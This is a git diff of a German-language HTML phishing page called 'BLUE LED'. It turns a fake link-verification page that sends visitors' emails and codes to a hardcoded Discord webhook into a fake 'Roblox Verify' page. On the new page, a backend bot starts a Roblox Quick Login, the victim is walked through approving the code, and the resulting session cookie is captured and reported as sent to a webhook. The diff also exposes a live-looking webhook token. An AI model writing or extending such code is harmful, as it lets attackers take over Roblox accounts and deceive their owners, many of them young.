@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BLUE LED VERIFY • Link Generator</title>
+    <title>BLUE LED • ROBLOX VERIFY</title>
     <style>
         * {
             margin: 0;
@@ -59,7 +59,7 @@
         .container {
             position: relative;
             z-index: 1;
-            max-width: 800px;
+            max-width: 500px;
             width: 100%;
             background: #0a1428;
             border: 3px solid #00a6ff;
@@ -68,254 +68,57 @@
             box-shadow: 
                 0 0 30px #00a6ff,
                 inset 0 0 20px #00a6ff40;
-            backdrop-filter: blur(10px);
         }
 
         h1 {
             color: #00a6ff;
-            font-size: 2.8em;
+            font-size: 2.2em;
             text-align: center;
             margin-bottom: 10px;
             text-transform: uppercase;
-            letter-spacing: 5px;
-            text-shadow: 
-                0 0 10px #00a6ff,
-                0 0 20px #00a6ff,
-                0 0 40px #00a6ff;
-            font-weight: 900;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px #00a6ff;
         }
 
         .subtitle {
             color: #7aa9ff;
             text-align: center;
-            margin-bottom: 40px;
-            font-size: 1.2em;
-            letter-spacing: 2px;
+            margin-bottom: 30px;
+            font-size: 1em;
             border-bottom: 2px solid #00a6ff40;
             padding-bottom: 20px;
         }
 
-        .led-status {
-            background: #0a1428;
-            border: 2px solid #00a6ff;
-            border-radius: 50px;
-            padding: 15px 25px;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 0 15px #00a6ff;
-        }
-
-        .led-light {
-            width: 20px;
-            height: 20px;
-            background: #00a6ff;
-            border-radius: 50%;
-            box-shadow: 0 0 20px #00a6ff;
-            animation: blink 2s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .led-text {
-            color: #00a6ff;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .generator-box {
+        .step-box {
             background: #0f1a30;
             border: 2px solid #00a6ff;
             border-radius: 20px;
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: inset 0 0 20px #000;
-        }
-
-        label {
-            color: #7aa9ff;
-            display: block;
-            margin-bottom: 10px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-size: 0.9em;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 10px;
+            padding: 25px;
             margin-bottom: 20px;
-            flex-wrap: wrap;
         }
 
-        .input-group input {
-            flex: 1;
-            background: #0a1428;
-            border: 2px solid #00a6ff;
-            border-radius: 15px;
-            padding: 15px 20px;
+        .step-title {
             color: #00a6ff;
-            font-size: 16px;
-            font-family: monospace;
-            min-width: 200px;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            box-shadow: 0 0 15px #00a6ff;
-        }
-
-        .input-group input::placeholder {
-            color: #00a6ff60;
-        }
-
-        button {
-            background: transparent;
-            border: 2px solid #00a6ff;
-            color: #00a6ff;
-            padding: 15px 30px;
-            border-radius: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 10px #00a6ff;
-        }
-
-        button:hover {
-            background: #00a6ff;
-            color: #000510;
-            box-shadow: 0 0 30px #00a6ff;
-        }
-
-        .link-display {
-            background: #0a1428;
-            border: 2px solid #00a6ff;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
+            font-size: 1.2em;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .link-url {
-            flex: 1;
-            color: #00a6ff;
-            font-family: monospace;
-            font-size: 1.2em;
-            word-break: break-all;
-        }
-
-        .copy-btn {
-            padding: 10px 20px;
-            font-size: 14px;
-        }
-
-        .steps {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin: 30px 0;
-        }
-
-        .step {
-            background: #0f1a30;
-            border: 2px solid #00a6ff;
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
+            gap: 10px;
         }
 
         .step-number {
-            width: 30px;
-            height: 30px;
             background: #00a6ff;
             color: #000;
+            width: 25px;
+            height: 25px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 15px;
             font-weight: bold;
         }
 
-        .step-text {
-            color: #7aa9ff;
-            font-size: 0.9em;
-        }
-
-        .logs {
-            background: #0a1428;
-            border: 2px solid #00a6ff;
-            border-radius: 15px;
-            padding: 20px;
-            margin-top: 30px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-family: monospace;
-        }
-
-        .log-entry {
-            color: #00a6ff;
-            padding: 5px;
-            border-bottom: 1px solid #00a6ff20;
-            font-size: 0.9em;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #7aa9ff;
-            font-size: 0.9em;
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 5, 16, 0.95);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: #0f1a30;
-            border: 3px solid #00a6ff;
-            border-radius: 30px;
-            padding: 40px;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 0 0 50px #00a6ff;
-        }
-
-        .modal-title {
-            color: #00a6ff;
-            font-size: 1.8em;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .modal-input {
+        input {
             width: 100%;
             background: #0a1428;
             border: 2px solid #00a6ff;
@@ -323,276 +126,314 @@
             padding: 15px;
             color: #00a6ff;
             font-size: 16px;
+            margin: 10px 0;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 15px #00a6ff;
+        }
+
+        button {
+            width: 100%;
+            background: transparent;
+            border: 2px solid #00a6ff;
+            color: #00a6ff;
+            padding: 15px;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+
+        button:hover:not(:disabled) {
+            background: #00a6ff;
+            color: #000;
+            box-shadow: 0 0 20px #00a6ff;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .status-box {
+            background: #0a1428;
+            border: 2px solid #00a6ff;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            color: #7aa9ff;
+            font-family: monospace;
+        }
+
+        .code-display {
+            font-size: 2em;
+            color: #00a6ff;
+            text-align: center;
+            padding: 20px;
+            background: #0a1428;
+            border: 2px dashed #00a6ff;
+            border-radius: 10px;
             margin: 15px 0;
+            letter-spacing: 5px;
         }
 
-        .modal-buttons {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
+        .hidden {
+            display: none;
         }
 
-        .modal-buttons button {
-            flex: 1;
+        .success {
+            color: #00ff88;
+            text-align: center;
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7aa9ff;
+            font-size: 0.8em;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #00a6ff40;
+            border-top-color: #00a6ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="grid-overlay"></div>
-    
-    <!-- EMAIL MODAL -->
-    <div class="modal" id="emailModal">
-        <div class="modal-content">
-            <div class="modal-title">📧 EMAIL VERIFY</div>
-            <input type="email" class="modal-input" id="emailInput" placeholder="deine@email.com">
-            <div class="modal-buttons">
-                <button onclick="sendEmail()">SENDEN</button>
-                <button onclick="closeModal()">ABBRECHEN</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- CODE MODAL -->
-    <div class="modal" id="codeModal">
-        <div class="modal-content">
-            <div class="modal-title">🔑 CODE EINGEBEN</div>
-            <input type="text" class="modal-input" id="codeInput" placeholder="6-stelliger Code">
-            <div class="modal-buttons">
-                <button onclick="verifyCode()">VERIFY</button>
-                <button onclick="closeModal()">ABBRECHEN</button>
-            </div>
-        </div>
-    </div>
 
     <div class="container">
-        <h1>BLUE LED VERIFY</h1>
-        <div class="subtitle">⚡ LINK GENERATOR v2.0 - JEDER PFAD FUNKTIONIERT ⚡</div>
+        <h1>🔵 ROBLOX VERIFY</h1>
+        <div class="subtitle">Quick Login • Account Verification</div>
 
-        <div class="led-status">
-            <span class="led-text">🔵 SYSTEM STATUS: ONLINE</span>
-            <div class="led-light"></div>
+        <!-- STEP 1: EMAIL EINGABE -->
+        <div class="step-box" id="step1">
+            <div class="step-title">
+                <span class="step-number">1</span>
+                <span>Email eingeben (Roblox Account)</span>
+            </div>
+            <input type="email" id="emailInput" placeholder="deine@email.com" value="test@email.com">
+            <button onclick="startQuickLogin()" id="startBtn">▶ QUICK LOGIN STARTEN</button>
         </div>
 
-        <div class="generator-box">
-            <label>🔗 LINK GENERATOR</label>
-            <div class="input-group">
-                <input type="text" id="customPath" placeholder="irgendwas eingeben - z.B. fortnite-free" value="test-verify6">
-                <button onclick="generateLink()">GENERATE</button>
+        <!-- STEP 2: CODE GENERIEREN (BOT) -->
+        <div class="step-box hidden" id="step2">
+            <div class="step-title">
+                <span class="step-number">2</span>
+                <span>Roblox Quick Login gestartet</span>
+            </div>
+            
+            <div class="status-box" id="statusBox">
+                <div style="margin-bottom: 10px;">🤖 BOT Status:</div>
+                <div id="botStatus">Token wird erstellt...</div>
+                <div class="loading" style="margin-top: 10px;"></div>
             </div>
 
-            <div class="link-display" id="linkDisplay" style="display: none;">
-                <span class="link-url" id="generatedLink"></span>
-                <button class="copy-btn" onclick="copyLink()">📋 COPY</button>
-            </div>
-        </div>
-
-        <div class="steps">
-            <div class="step">
-                <div class="step-number">1</div>
-                <div class="step-text">GENERATE LINK<br>JEDER PFAD GEHT!</div>
-            </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <div class="step-text">EMAIL EINGEBEN<br>Wird an Webhook gesendet</div>
-            </div>
-            <div class="step">
-                <div class="step-number">3</div>
-                <div class="step-text">CODE VERIFY<br>6-stelligen Code bestätigen</div>
+            <div class="code-display hidden" id="codeDisplay">
+                <div style="font-size: 0.5em; color: #7aa9ff;">Roblox Code:</div>
+                <span id="robloxCode">---</span>
             </div>
         </div>
 
-        <div class="logs" id="logContainer">
-            <div class="log-entry">🔵 SYSTEM INITIALIZED</div>
-            <div class="log-entry">⚡ WEBHOOK: READY</div>
-            <div class="log-entry">📡 LINK GENERATOR: ACTIVE - ALLE PFADE AKZEPTIERT</div>
+        <!-- STEP 3: CODE EINGABE -->
+        <div class="step-box hidden" id="step3">
+            <div class="step-title">
+                <span class="step-number">3</span>
+                <span>Code von Roblox eingeben</span>
+            </div>
+            
+            <div class="status-box">
+                📧 Roblox hat einen Code an deine Email geschickt.<br>
+                Gib ihn hier ein:
+            </div>
+            
+            <input type="text" id="codeInput" placeholder="6-stelligen Code eingeben" maxlength="6">
+            <button onclick="verifyCode()" id="verifyBtn">✓ CODE BESTÄTIGEN</button>
+            <div id="verifyStatus"></div>
+        </div>
+
+        <!-- STEP 4: SUCCESS -->
+        <div class="step-box hidden" id="step4">
+            <div class="step-title">
+                <span class="step-number">✅</span>
+                <span>VERIFY SUCCESSFUL</span>
+            </div>
+            
+            <div class="success" id="successMessage">
+                Account erfolgreich verifiziert!<br>
+                <span style="font-size: 0.8em;">Cookie wurde an Webhook gesendet</span>
+            </div>
         </div>
 
         <div class="footer">
-            <p>🔵 BLUE LED SYSTEM • JEDER PFAD WIRD AKZEPTIERT • v2.0</p>
+            🔵 BLUE LED • ROBLOX QUICK LOGIN SYSTEM
         </div>
     </div>
 
     <script>
-        // ===========================================
-        // BLUE LED VERIFICATION SYSTEM - FIXED VERSION
-        // ===========================================
-        
-        // DISCORD WEBHOOK URL (DEINE EINGEBEN!)
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481293642122658064/_gKaaPwTFeyJxARJuOZFpnjI1TJo5FdLM5HacVCqkUTJ9BL7TvT1JBbiVasJPP7fmjpY"
-        
-        // Store current verification
-        let currentPath = '';
+        // State
         let currentEmail = '';
         let currentCode = '';
-        
-        // Logging function
-        function addLog(message) {
-            const logContainer = document.getElementById('logContainer');
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.textContent = `🔵 ${new Date().toLocaleTimeString()} • ${message}`;
-            logContainer.appendChild(logEntry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-        
-        // Generate random 6-digit code
-        function generateCode() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
-        }
-        
-        // Send to Discord Webhook
-        async function sendToWebhook(data) {
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `🔵 **BLUE LED VERIFICATION**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
-                        username: 'Blue LED Verify',
-                    })
-                });
-                
-                if (response.ok) {
-                    addLog(`✅ Webhook sent: ${data.type}`);
-                } else {
-                    addLog(`❌ Webhook failed: ${response.status}`);
-                }
-            } catch (error) {
-                addLog(`❌ Webhook error: ${error.message}`);
-            }
-        }
-        
-        // Generate verification link
-        function generateLink() {
-            const customPath = document.getElementById('customPath').value.trim();
-            
-            if (!customPath) {
-                alert('Bitte Pfad eingeben!');
-                return;
-            }
-            
-            // Clean the path (entfernt Sonderzeichen)
-            const cleanPath = customPath.replace(/[^a-zA-Z0-9-]/g, '-').toLowerCase();
-            const baseUrl = window.location.origin;
-            const fullLink = `${baseUrl}/verify/${cleanPath}`;
-            
-            currentPath = cleanPath;
-            
-            // Display link
-            document.getElementById('generatedLink').textContent = fullLink;
-            document.getElementById('linkDisplay').style.display = 'flex';
-            
-            addLog(`🔗 Link generated: /verify/${cleanPath}`);
-        }
-        
-        // Copy link to clipboard
-        function copyLink() {
-            const link = document.getElementById('generatedLink').textContent;
-            navigator.clipboard.writeText(link);
-            addLog('📋 Link copied to clipboard');
-            alert('Link kopiert!');
-        }
-        
-        // Handle routing - FIXED: JEDER PFAD WIRD AKZEPTIERT!
-        function handleRouting() {
-            const path = window.location.pathname;
-            const verifyMatch = path.match(/^\/verify\/(.+)/); // .+ akzeptiert ALLES!
-            
-            if (verifyMatch) {
-                const verifyPath = verifyMatch[1];
-                currentPath = verifyPath;
-                
-                addLog(`🔗 User accessed: /verify/${verifyPath} (AKZEPTIERT!)`);
-                
-                // KEINE PRÜFUNG MEHR - JEDER PFAD GEHT!
-                // Show email modal direkt
-                document.getElementById('emailModal').classList.add('active');
-            }
-        }
-        
-        // Send email and prompt for code
-        async function sendEmail() {
+        let privateKey = '';
+        let checkInterval = null;
+
+        // Step 1: Start Quick Login
+        async function startQuickLogin() {
             const email = document.getElementById('emailInput').value.trim();
             
             if (!email || !email.includes('@')) {
                 alert('Bitte gültige Email eingeben!');
                 return;
             }
-            
+
             currentEmail = email;
-            currentCode = generateCode();
-            
-            // Send to webhook (EMAIL)
-            await sendToWebhook({
-                type: 'EMAIL_SUBMITTED',
-                path: currentPath,
-                email: currentEmail,
-                code: currentCode,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            });
-            
-            addLog(`📧 Email submitted: ${email}`);
-            addLog(`🔑 Code generated: ${currentCode}`);
-            
-            // Close email modal, open code modal
-            document.getElementById('emailModal').classList.remove('active');
-            document.getElementById('codeModal').classList.add('active');
-            document.getElementById('emailInput').value = ''; // Clear email input
-        }
-        
-        // Verify code
-        async function verifyCode() {
-            const inputCode = document.getElementById('codeInput').value.trim();
-            
-            if (inputCode === currentCode) {
-                // Code correct
-                await sendToWebhook({
-                    type: 'VERIFICATION_SUCCESS',
-                    path: currentPath,
-                    email: currentEmail,
-                    code: inputCode,
-                    timestamp: new Date().toISOString()
+
+            // UI Update
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('botStatus').innerHTML = '🤖 Verbinde zu Roblox API...';
+
+            try {
+                // API Call zu unserem Bot
+                const response = await fetch('/api/quick-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: currentEmail })
                 });
-                
-                addLog(`✅ Verification SUCCESS for ${currentEmail}`);
-                alert('✅ VERIFIZIERT! Zugriff gewährt.');
-                
-                closeModal();
-                
-                // Reset
-                document.getElementById('codeInput').value = '';
-            } else {
-                // Code wrong
-                await sendToWebhook({
-                    type: 'VERIFICATION_FAILED',
-                    path: currentPath,
-                    email: currentEmail,
-                    attemptedCode: inputCode,
-                    correctCode: currentCode,
-                    timestamp: new Date().toISOString()
-                });
-                
-                addLog(`❌ Wrong code attempt: ${inputCode}`);
-                alert('❌ Falscher Code!');
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Bot hat Token erstellt
+                    document.getElementById('botStatus').innerHTML = '✅ Quick Login Token erstellt!';
+                    
+                    // Speichere privateKey für spätere Prüfungen
+                    privateKey = data.privateKey;
+                    
+                    // Zeige Code (für Testzwecke - später optional)
+                    document.getElementById('robloxCode').textContent = data.code;
+                    document.getElementById('codeDisplay').classList.remove('hidden');
+                    
+                    // Weiter zu Schritt 3 nach kurzer Pause
+                    setTimeout(() => {
+                        document.getElementById('step2').classList.add('hidden');
+                        document.getElementById('step3').classList.remove('hidden');
+                    }, 2000);
+
+                    // Starte Status-Checker im Hintergrund
+                    startStatusChecker(data.code, data.privateKey);
+                } else {
+                    throw new Error(data.error || 'Fehler beim Quick Login');
+                }
+
+            } catch (error) {
+                document.getElementById('botStatus').innerHTML = `❌ Fehler: ${error.message}`;
             }
         }
-        
-        // Close modals
-        function closeModal() {
-            document.getElementById('emailModal').classList.remove('active');
-            document.getElementById('codeModal').classList.remove('active');
+
+        // Status Checker (prüft ob User Code bei Roblox eingegeben hat)
+        function startStatusChecker(code, key) {
+            checkInterval = setInterval(async () => {
+                try {
+                    const response = await fetch('/api/check-status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ code, privateKey: key })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.status === 'Validated') {
+                        // User hat Code bei Roblox eingegeben!
+                        clearInterval(checkInterval);
+                        
+                        // Login durchführen und Cookie holen
+                        const loginResponse = await fetch('/api/verify-code', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                code, 
+                                privateKey: key,
+                                email: currentEmail 
+                            })
+                        });
+
+                        const loginData = await loginResponse.json();
+
+                        if (loginData.success) {
+                            // Alles fertig - Success anzeigen
+                            document.getElementById('step3').classList.add('hidden');
+                            document.getElementById('step4').classList.remove('hidden');
+                            
+                            // Optional: Details anzeigen
+                            document.getElementById('successMessage').innerHTML = `
+                                ✅ Account erfolgreich verifiziert!<br>
+                                <span style="font-size: 0.8em;">Cookie: ${loginData.cookie ? '✓ erhalten' : '✓ gesendet'}</span>
+                            `;
+                        }
+                    }
+                } catch (error) {
+                    console.log('Status check error:', error);
+                }
+            }, 3000); // Alle 3 Sekunden prüfen
         }
-        
-        // Check URL on load and hash change
-        window.addEventListener('load', handleRouting);
-        window.addEventListener('popstate', handleRouting);
-        
-        // Initial log
-        addLog('🔵 BLUE LED SYSTEM READY - ALLE PFADE AKZEPTIERT!');
-        addLog(`🔗 Base URL: ${window.location.origin}`);
+
+        // Step 3: User gibt Code ein (den er von Roblox per Email bekommen hat)
+        async function verifyCode() {
+            const userCode = document.getElementById('codeInput').value.trim();
+            
+            if (!userCode || userCode.length !== 6) {
+                alert('Bitte 6-stelligen Code eingeben!');
+                return;
+            }
+
+            document.getElementById('verifyStatus').innerHTML = '🔄 Prüfe Code...';
+            document.getElementById('verifyBtn').disabled = true;
+
+            try {
+                // Prüfen ob der eingegebene Code mit dem Roblox-Code übereinstimmt
+                const response = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        email: currentEmail,
+                        userCode: userCode,
+                        privateKey: privateKey
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    document.getElementById('verifyStatus').innerHTML = '✅ Code korrekt!';
+                    
+                    // Status-Checker läuft bereits im Hintergrund
+                    document.getElementById('verifyStatus').innerHTML += '<br>⏳ Warte auf Roblox-Bestätigung...';
+                } else {
+                    document.getElementById('verifyStatus').innerHTML = `❌ ${data.error || 'Falscher Code'}`;
+                    document.getElementById('verifyBtn').disabled = false;
+                }
+
+            } catch (error) {
+                document.getElementById('verifyStatus').innerHTML = `❌ Fehler: ${error.message}`;
+                document.getElementById('verifyBtn').disabled = false;
+            }
+        }
     </script>
 </body>
 </html>
